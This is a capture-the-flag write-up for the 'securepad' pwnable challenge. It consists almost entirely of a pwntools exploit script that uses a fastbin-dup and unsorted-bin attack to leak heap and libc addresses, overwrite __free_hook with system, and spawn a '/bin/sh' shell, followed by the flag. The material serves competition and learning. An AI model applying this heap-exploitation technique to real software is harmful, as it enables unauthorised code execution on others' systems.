# **securepad**

#### tag : pwnable, fastbin-dup-attack, unsortedbin-attack

-----------------------------------------------

#### Description

> ======= Difficulty level : Medium =======
>
> nc 18.224.57.15 1337
>
> ======= Authors : 4rbit3r, infinite =======

-----------------------------------------------

#### Solution

```python

from pwn import *

### DEBUGGING ###
DEBUG = True
context.log_level = 'debug'

if DEBUG:
    r = process('./securepad_1504b0cfc0a1c49ca45876e1e684abcb7324e5e', env = {'LD_PRELOAD': './libc_14c22be9aa11316f89909e4237314e009da38883.so.6'})
    #gdb.attach(r, '''break main''')
    timeout = 0.1

else :
    r = remote('18.224.57.15', 1337)
    timeout = 0.3

def rr(s):
    sleep(timeout)
    return r.recvuntil(s)

def ss(s):
    sleep(timeout)
    return r.send(s)
    #return r.sendline(s)

def auth(s):
    rr('d\n')
    ss(s)

def add(p, s, d):
    rr('>>> ')
    ss('1')

    auth(p)

    rr('size\n')
    ss(str(s))

    rr(': ')
    ss(d)

def edit(p, i, d):
    rr('>>> ')
    ss('2')

    auth(p)

    rr('index\n')
    ss(str(i))

    ss(d)

def delete(p, i):
    rr('>>> ')
    ss('3')

    auth(p)

    rr('index\n')
    ss(str(i))

def view(p, i):
    rr('>>> ')
    ss('4')

    auth(p)

    rr('index\n')
    ss(str(i))

    return rr('\n0)')

### ADDRESS ###
# .data:00000000003C4B78 qword_3C4B78    dq 0
main_arena_offset = 0x3c4b78

# .bss:00000000003C67A8                 public __free_hook ; weak
# .bss:00000000003C67A8 __free_hook     db    ? ;
free_hook_offset = 0x3c67a8

# libc.symbols['system']
# 283536
libc_system_offset = 0x45390

### EXPLOIT ###
def main():
    # table[0] : chunk1 (0x21)
    # table[1] : chunk2 (0x21)
    add('A', 0x10, 'A')
    add('A', 0x10, 'A')

    # fastbins (0x20) : chunk2 -> chunk1
    delete('A', 0)
    delete('A', 1)

    # table[0] : chunk2
    add('A', 0x10, 'A')

    # leak heap base address
    heap_base = (u64(('\x00' + view('A', 0)[1:-3]).ljust(8, '\x00')))
    log.info('heap base : 0x%x' % heap_base)

    # fastbins (0x20) : chunk2 -> chunk1
    delete('A', 0)

    # make fake chunk smallbins (0xe1)
    # table[0] : chunk3 (0x81)
    # table[1] : chunk4 (0x71)
    # table[2] : chunk5 (0x61)
    fake_chunk = p64(0) + p64(0xe1)
    add('A', 0x70, fake_chunk)
    add('A', 0x60, 'A')
    add('A', 0x30, 'A')

    # free fake chunk
    free_ptr = 'A' * 1008 + p64(heap_base + 0x60)
    delete(free_ptr, 10)

    # table[3] : chunk6 (0x71)
    add('A', 0x60, 'A')

    # leak main_arena and libc base address
    main_arena = u64((view('A', 1)[:-3]).ljust(8, '\x00'))
    libc_base = main_arena - main_arena_offset
    system = libc_base + libc_system_offset
    log.info('libc base : 0x%x' % libc_base)
    log.info('system : 0x%x' % system)

    # leak free_hook address
    free_hook = libc_base + free_hook_offset
    log.info('free hook : 0x%x' % free_hook)

    # free hook overwrite
    # table[4] : chunk7 (0x71)
    free_hook_overwrite = p64(0) + p64(free_hook-0x28)
    edit('A', 1, free_hook_overwrite)
    add('A', 0x60, 'A')

    # fastbins (0x70) : chunk6 -> chunk7 -> chunk6
    delete('A', 3)
    delete('A', 4)
    delete(free_ptr, 10)

    # table[3] : chunk6 (0x71)
    add('A', 0x60, p64(free_hook-0x1b))

    # table[4] : chunk7 (0x71)
    add('A', 0x60, 'A')

    # table[5] : chunk6 (0x71)
    add('A', 0x60, 'A')

    # table[6] : fake chunk
    # overwrite free_hook -> system
    add('A', 0x60, '\x00' * 0xb + p64(system))

    # system paremeter "/bin/sh"
    edit('A', 2, '/bin/sh\x00')

    # system("/bin/sh")
    delete('A', 2)

    r.interactive()

if __name__ == '__main__':
    try:
        main()
    except:
        log.info('exception occur')

#inctf{sp1r1t3d_n0te_t0_uns3cur3_the_p4d}

```
